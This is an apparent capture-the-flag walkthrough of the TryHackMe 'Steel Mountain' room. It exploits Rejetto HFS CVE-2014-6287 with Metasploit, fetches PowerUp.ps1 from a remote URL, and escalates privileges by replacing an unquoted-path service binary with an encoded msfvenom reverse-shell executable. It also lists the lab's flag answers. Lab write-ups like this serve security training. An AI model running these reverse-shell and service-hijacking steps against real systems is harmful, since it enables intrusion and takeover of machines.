![c9030a2b60bb7d1cf4fcb6e5032526d3](https://github.com/user-attachments/assets/1fccd7c7-a3e3-414c-85f9-337b55ee033d)
 
https://tryhackme.com/room/steelmountain

# Steel Mountain Walkthrough
## TASK 1 - Introduction

Who is the employee of the month?

![Screenshot](https://github.com/user-attachments/assets/30f54f4f-514e-4272-8cc1-bfa085274d4d)

(Bill Harper)

## TASK 2 - Initial Access

Scan the machine with nmap. What is the other port running a web server on?

![Firefox_Screenshot_2025-03-26T17-56-36 928Z](https://github.com/user-attachments/assets/28807218-6b07-4918-9432-85ef064207b6)

(8080)

Take a look at the other web server. What file server is running?

Open the port 8080 and notice the file server link.

(Rejetto HTTP File Server)

What is the CVE number to exploit this file server?

When you did research on google, you can find CVE number about Rejetto HTTP File Server 2.3: https://www.exploit-db.com/exploits/39161

(2014-6287)

Use Metasploit to get an initial shell. What is the user flag?

1) msfconsole
2) search 2014-6287
3) use 0
4) show options

![Firefox_Screenshot_2025-03-26T20-44-31 403Z](https://github.com/user-attachments/assets/495e8e23-9302-487f-beeb-a6046e0f6b0f)

5) We have to set RHOSTS and RPORT

set RHOSTS $IP

set RPORT 8080

6) set payload windows/meterpreter/reverse_tcp
7) run
8) C:\Users\bill\Desktop // cat user.txt

![Firefox_Screenshot_2025-03-26T21-20-35 228Z](https://github.com/user-attachments/assets/b6350317-e3d9-4aaf-b85b-2f718cd37ddb)

(b04763b6fcf51fcd7c13abc7db4fd365)

## TASK 3 - Privilege Escalation

Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?

1) Download the script (https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)

2) Upload the script from meterpreter session

![Untitled](https://github.com/user-attachments/assets/0f37002b-a7e0-41a2-9817-594243222e8c)

3) Load powershell in meterpreter (type "load powershell" into meterpreter)

4) Type powershell_shell

5) Type . .\Powerup.ps1

6) Type Invoke-AllChecks

![Untitled](https://github.com/user-attachments/assets/d880fac8-5106-4520-8b72-e02d993c38dd)

(AdvancedSystemCareService9)

What is the root flag?

1) Use msfvenom to generate a reverse shell as an Windows executable. (msfvenom -p windows/shell_reverse_tcp LHOST=your_ip LPORT=4443 -e x86/shikata_ga_nai -f exe -o ASCService.exe)

![Untitled](https://github.com/user-attachments/assets/288ddbd5-7d64-404c-9692-fffcaede24c0)

2) Open shell and stop the service which using ASCService.exe

sc stop AdvancedSystemCareService9

![Untitled](https://github.com/user-attachments/assets/573a1849-6339-43c0-b846-9610b767b322)

After that exit the shell.

3) Go to C:\Program Files (x86)\IObit\Advanced SystemCare and upload ASCService.exe file which we generated.

![adsa](https://github.com/user-attachments/assets/25367f9a-79ac-4166-9acb-387c55ae4dd0)

4) We need to listen our reverse shell. Open new terminal and ...

![adsa](https://github.com/user-attachments/assets/e3ad13f7-1405-42db-a0de-d106bd728ed3)

5) Return to meterpreter, open shell and "sc start AdvancedSystemCareService9"

![adsa](https://github.com/user-attachments/assets/7cbb3251-f21e-4e2f-a35c-c7ec4ddc4f89)

6) After that return to netcat terminal which we listining our reverse shell

![adsa](https://github.com/user-attachments/assets/00fa06a6-da7a-4915-8cc4-61b7f4da7074)


(9af5f314f57607c00fd09803a587db80)

## TASK 4 - Access and Escalation Without Metasploit

What powershell -c command could we run to manually find out the service name? 

(powershell -c "Get-Service")



